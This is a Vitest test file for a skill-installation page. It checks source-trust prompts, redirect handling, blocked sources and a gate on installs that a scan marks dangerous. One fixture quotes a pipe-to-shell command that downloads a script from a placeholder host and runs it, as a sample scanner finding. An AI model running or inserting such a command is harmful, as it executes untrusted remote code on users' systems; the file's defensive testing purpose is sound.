import { screen, waitFor, within } from "@testing-library/react";
import type { UserEvent } from "@testing-library/user-event";
import { describe, expect, it, vi } from "vitest";
import type { ScanResult, SkillInstalled, TrustGrantArg } from "@/ipc/bindings";
import type { CommandResult } from "@/ipc/transport";
import {
  createMockTransport,
  MOCK_SKILL_INSTALLED,
  MOCK_SKILL_REVIEW,
  MOCK_TRUST_ASK,
  mockIpcError,
  ok,
  type MockTransportOptions,
} from "@/test/mockTransport";
import { renderWithProviders } from "@/test/renderWithProviders";
import { InstallPage } from "./InstallPage";

function renderPage(commands: MockTransportOptions["commands"] = {}) {
  const onOpenSkills = vi.fn();
  const view = renderWithProviders(<InstallPage onOpenSkills={onOpenSkills} />, { commands });
  return { onOpenSkills, ...view };
}

const DANGEROUS: ScanResult = {
  verdict: "dangerous",
  findings: [
    {
      scanner: "builtin",
      rule: "pipe-to-shell",
      severity: "dangerous",
      file: "scripts/setup.sh",
      line: 3,
      message: "Downloads a script and runs it in a shell.",
      excerpt: "curl https://example.invalid/x.sh | sh",
    },
  ],
  rulesVersion: 1,
  cached: false,
  customRules: false,
  warnings: [],
};

function installCalls(transport: { invocations: { command: string; args: unknown[] }[] }) {
  return transport.invocations.filter((call) => call.command === "installReviewedSkill").map((call) => call.args);
}

async function openGitReview(user: UserEvent) {
  await user.type(screen.getByRole("textbox", { name: "Git repository URL" }), "https://github.com/acme/skills");
  await user.click(screen.getByRole("button", { name: "Review and install" }));
  return screen.findByRole("dialog", { name: "Review repo-notes" });
}

describe("InstallPage", () => {
  it("offers Skill (Git, Local), MCP and Browse; no marketplace or plugin tabs", async () => {
    const { user } = renderPage();
    const toolbar = screen.getByTestId("header-toolbar");
    expect(within(toolbar).getAllByRole("tab").map((tab) => tab.textContent)).toEqual(["Skill", "MCP", "Browse"]);
    expect(screen.getAllByRole("tab", { name: /Git|Local/ }).map((tab) => tab.textContent)).toEqual(["Git", "Local"]);
    expect(screen.queryByText(/Marketplace|Plugin/)).toBeNull();
    await user.click(within(toolbar).getByRole("tab", { name: "MCP" }));
    expect(screen.getAllByRole("tab", { name: /Form|From Git/ }).map((tab) => tab.textContent)).toEqual([
      "Form or paste",
      "From Git or folder",
    ]);
  });

  it("opens Browse on the online-catalogs question without searching", async () => {
    const { user, transport } = renderPage();
    await user.click(within(screen.getByTestId("header-toolbar")).getByRole("tab", { name: "Browse" }));
    expect(await screen.findByRole("heading", { name: "Turn on online catalogs?" })).toBeInTheDocument();
    expect(transport.calls).not.toContain("searchCatalog");
  });

  it("reviews a git URL with the optional folder and ref, then installs exactly that review", async () => {
    const { user, transport, onOpenSkills } = renderPage();
    const submit = screen.getByRole("button", { name: "Review and install" });
    expect(submit).toBeDisabled();
    await user.type(screen.getByRole("textbox", { name: "Git repository URL" }), " https://github.com/acme/skills ");
    await user.type(screen.getByRole("textbox", { name: "Skill folder in the repository (optional)" }), "skills/alpha");
    await user.type(screen.getByRole("textbox", { name: "Branch or tag (optional)" }), "main");
    await user.click(submit);
    const review = await screen.findByRole("dialog", { name: "Review repo-notes" });
    expect(transport.invocations).toContainEqual({
      command: "reviewGitSkill",
      args: ["https://github.com/acme/skills", "skills/alpha", "main"],
    });
    expect(within(review).getByText("SKILL.md")).toBeInTheDocument();
    expect(within(review).getByText("Clean")).toBeInTheDocument();
    await user.click(within(review).getByRole("button", { name: "Install" }));
    await waitFor(() => expect(installCalls(transport)).toEqual([["review-1", null, false, false, null, null]]));
    expect(await screen.findByText("Installed repo-notes as repo-notes.")).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "View in Skills" }));
    expect(onOpenSkills).toHaveBeenCalled();
    expect(screen.getByRole("textbox", { name: "Git repository URL" })).toHaveValue("");
  });

  it("asks the trust question for an untrusted source and sends the answer", async () => {
    const { user, transport } = renderPage({
      reviewGitSkill: async () => ok({ ...MOCK_SKILL_REVIEW, trust: MOCK_TRUST_ASK }),
    });
    const review = await openGitReview(user);
    expect(within(review).getByText("Not trusted yet")).toBeInTheDocument();

    // Cancel: nothing is installed and the review stays open.
    await user.click(within(review).getByRole("button", { name: "Install" }));
    let trust = await screen.findByRole("alertdialog", { name: "Trust this source?" });
    expect(within(trust).getByRole("radio", { name: "Trust this time only" })).toBeChecked();
    await user.click(within(trust).getByRole("button", { name: "Cancel" }));
    expect(installCalls(transport)).toEqual([]);
    expect(screen.getByRole("dialog", { name: "Review repo-notes" })).toBeInTheDocument();

    // Always trust the owner.
    await user.click(within(review).getByRole("button", { name: "Install" }));
    trust = await screen.findByRole("alertdialog", { name: "Trust this source?" });
    await user.click(within(trust).getByRole("radio", { name: "Always trust everything from github.com/acme/*" }));
    await user.click(within(trust).getByRole("button", { name: "Always trust and continue" }));
    await waitFor(() =>
      expect(installCalls(transport)).toEqual([["review-1", null, false, false, { kind: "always", scope: "owner" }, null]]),
    );
  });

  it("sends a once grant for Trust this time only", async () => {
    const { user, transport } = renderPage({
      reviewGitSkill: async () => ok({ ...MOCK_SKILL_REVIEW, trust: MOCK_TRUST_ASK }),
    });
    const review = await openGitReview(user);
    await user.click(within(review).getByRole("button", { name: "Install" }));
    const trust = await screen.findByRole("alertdialog", { name: "Trust this source?" });
    await user.click(within(trust).getByRole("button", { name: "Trust once and continue" }));
    await waitFor(() => expect(installCalls(transport)).toEqual([["review-1", null, false, false, { kind: "once" }, null]]));
  });

  it("blocks a dangerous verdict until the user explicitly picks Install anyway", async () => {
    const { user, transport } = renderPage({
      reviewGitSkill: async () => ok({ ...MOCK_SKILL_REVIEW, scan: DANGEROUS }),
    });
    const review = await openGitReview(user);
    expect(within(review).getByText("pipe-to-shell")).toBeInTheDocument();
    expect(within(review).getByText("scripts/setup.sh:3")).toBeInTheDocument();
    expect(within(review).getByText("Downloads a script and runs it in a shell.")).toBeInTheDocument();
    expect(within(review).queryByRole("button", { name: "Install" })).toBeNull();
    const anyway = within(review).getByRole("button", { name: "Install anyway" });
    expect(anyway).toBeDisabled();
    await user.click(within(review).getByRole("checkbox", { name: "I read the findings and want to go ahead anyway" }));
    await user.click(anyway);
    await waitFor(() => expect(installCalls(transport)).toEqual([["review-1", null, false, true, null, null]]));
  });

  it("does not offer Install for a blocked source", async () => {
    const { user } = renderPage({
      reviewGitSkill: async () =>
        ok({
          ...MOCK_SKILL_REVIEW,
          trust: { ...MOCK_TRUST_ASK, state: { kind: "blocked", scope: "owner", display: "github.com/acme/*", decidedAt: "2026-11-20T09:00:00Z" } },
        }),
    });
    const review = await openGitReview(user);
    expect(within(review).getByRole("button", { name: "Install" })).toBeDisabled();
    expect(within(review).getByRole("alert")).toHaveTextContent("blocked in Settings > Sources");
  });

  it("discards the review when it is closed without installing", async () => {
    const { user, transport } = renderPage();
    const review = await openGitReview(user);
    await user.click(within(review).getByRole("button", { name: "Cancel" }));
    expect(transport.invocations).toContainEqual({ command: "discardSkillReview", args: ["review-1"] });
    expect(installCalls(transport)).toEqual([]);
  });

  it("asks before installing a taken id as a new skill", async () => {
    const { user, transport } = renderPage({
      installReviewedSkill: async (_token, _id, renameIfTaken) =>
        renameIfTaken
          ? ok({ ...MOCK_SKILL_INSTALLED, id: "repo-notes-2", renamedFrom: "repo-notes" })
          : mockIpcError({ code: "already_exists", message: "taken" }),
    });
    const review = await openGitReview(user);
    await user.click(within(review).getByRole("button", { name: "Install" }));
    const confirm = await screen.findByRole("dialog", { name: "Skill id already in the store" });
    // A taken id is a question, not an error toast.
    expect(screen.queryByText("An entry with this name already exists.")).toBeNull();
    await user.click(within(confirm).getByRole("button", { name: "Install as a new skill" }));
    await waitFor(() => expect(installCalls(transport).map((args) => args[2])).toEqual([false, true]));
    expect(await screen.findByText("Installed repo-notes as repo-notes-2.")).toBeInTheDocument();
  });

  it("reviews a picked local folder by its token, never a typed path", async () => {
    const { user, transport } = renderPage({
      pickSkillSource: async () => ok({ token: "folder-1", path: "~/Downloads/repo-notes", name: "repo-notes" }),
    });
    await user.click(screen.getByRole("tab", { name: "Local" }));
    expect(screen.queryByRole("textbox", { name: /path/i })).toBeNull();
    const submit = screen.getByRole("button", { name: "Review and install" });
    expect(submit).toBeDisabled();
    await user.click(screen.getByRole("button", { name: "Choose archive" }));
    expect(transport.invocations).toContainEqual({ command: "pickSkillSource", args: ["archive"] });
    expect(await screen.findByText("~/Downloads/repo-notes")).toBeInTheDocument();
    await user.type(screen.getByRole("textbox", { name: "Skill ID (optional)" }), "notes");
    await user.click(submit);
    const review = await screen.findByRole("dialog", { name: "Review repo-notes" });
    expect(transport.invocations).toContainEqual({ command: "reviewLocalSkill", args: ["folder-1"] });
    await user.click(within(review).getByRole("button", { name: "Install" }));
    await waitFor(() => expect(installCalls(transport)).toEqual([["review-1", "notes", false, false, null, null]]));
  });

  it("opens the MCP form and the paste box", async () => {
    const { user } = renderPage();
    await user.click(within(screen.getByTestId("header-toolbar")).getByRole("tab", { name: "MCP" }));
    await user.click(screen.getByRole("button", { name: /Paste config/ }));
    expect(await screen.findByRole("dialog")).toBeInTheDocument();
  });

  it("asks about a redirect target separately and sends both answers in their places", async () => {
    const moved = {
      ...MOCK_TRUST_ASK,
      display: "github.com/new-owner/skills",
      scopes: [{ scope: "repo" as const, display: "github.com/new-owner/skills" }],
    };
    const { user, transport } = renderPage({
      reviewGitSkill: async () => ok({ ...MOCK_SKILL_REVIEW, trust: MOCK_TRUST_ASK, movedTrust: moved }),
    });
    const review = await openGitReview(user);
    expect(within(review).getByText("github.com/new-owner/skills")).toBeInTheDocument();
    await user.click(within(review).getByRole("button", { name: "Install" }));
    await user.click(within(await screen.findByRole("alertdialog")).getByRole("button", { name: "Trust once and continue" }));
    const second = await screen.findByRole("alertdialog");
    expect(within(second).getByText(/github\.com\/acme\/skills now redirects to github\.com\/new-owner\/skills\./)).toBeInTheDocument();
    await user.click(within(second).getByRole("radio", { name: "Always trust github.com/new-owner/skills" }));
    await user.click(within(second).getByRole("button", { name: "Always trust and continue" }));
    await waitFor(() =>
      expect(installCalls(transport)).toEqual([
        ["review-1", null, false, false, { kind: "once" }, { kind: "always", scope: "repo" }],
      ]),
    );
    expect(await screen.findByText("Installed repo-notes as repo-notes.")).toBeInTheDocument();
  });

  it("disables Install when the redirect target is blocked", async () => {
    const { user } = renderPage({
      reviewGitSkill: async () =>
        ok({
          ...MOCK_SKILL_REVIEW,
          movedTrust: {
            ...MOCK_TRUST_ASK,
            display: "github.com/new-owner/skills",
            state: { kind: "blocked", scope: "owner", display: "github.com/new-owner/*", decidedAt: "2026-11-20T09:00:00Z" },
          },
        }),
    });
    const review = await openGitReview(user);
    expect(within(review).getByRole("button", { name: "Install" })).toBeDisabled();
  });

  it("opens a dangerous review on the dialog, not on the acknowledgement", async () => {
    const { user } = renderPage({ reviewGitSkill: async () => ok({ ...MOCK_SKILL_REVIEW, scan: DANGEROUS }) });
    const review = await openGitReview(user);
    expect(within(review).getByRole("checkbox", { name: "I read the findings and want to go ahead anyway" })).not.toHaveFocus();
    expect(review).toHaveFocus();
  });

  it("keeps the review open while an install is in flight", async () => {
    let finish: (value: CommandResult<SkillInstalled>) => void = () => undefined;
    const { user, transport } = renderPage({
      installReviewedSkill: () => new Promise((resolve) => (finish = resolve)),
    });
    const review = await openGitReview(user);
    await user.click(within(review).getByRole("button", { name: "Install" }));
    expect(within(review).getByRole("button", { name: "Cancel" })).toBeDisabled();
    await user.keyboard("{Escape}");
    expect(screen.getByRole("dialog", { name: "Review repo-notes" })).toBeInTheDocument();
    expect(transport.calls).not.toContain("discardSkillReview");
    finish(ok(MOCK_SKILL_INSTALLED));
    await waitFor(() => expect(screen.queryByRole("dialog", { name: "Review repo-notes" })).toBeNull());
  });

  it("default mock refuses, like the backend, what the dialogs were not asked about", async () => {
    // A flow that skipped the trust question or dropped `allowDangerous` fails against the defaults.
    const transport = createMockTransport({
      commands: { reviewGitSkill: async () => ok({ ...MOCK_SKILL_REVIEW, trust: MOCK_TRUST_ASK, scan: DANGEROUS }) },
    });
    await transport.commands.reviewGitSkill("https://github.com/acme/skills", null, null);
    const install = (allowDangerous: boolean, trust: TrustGrantArg | null) =>
      transport.commands.installReviewedSkill("review-1", null, false, allowDangerous, trust, null);
    expect(await install(true, null)).toMatchObject({ status: "error", error: { code: "source_trust_required" } });
    expect(await install(false, { kind: "once" })).toMatchObject({ status: "error", error: { code: "scan_blocked" } });
    expect(await install(true, { kind: "once" })).toMatchObject({ status: "ok" });
  });
});
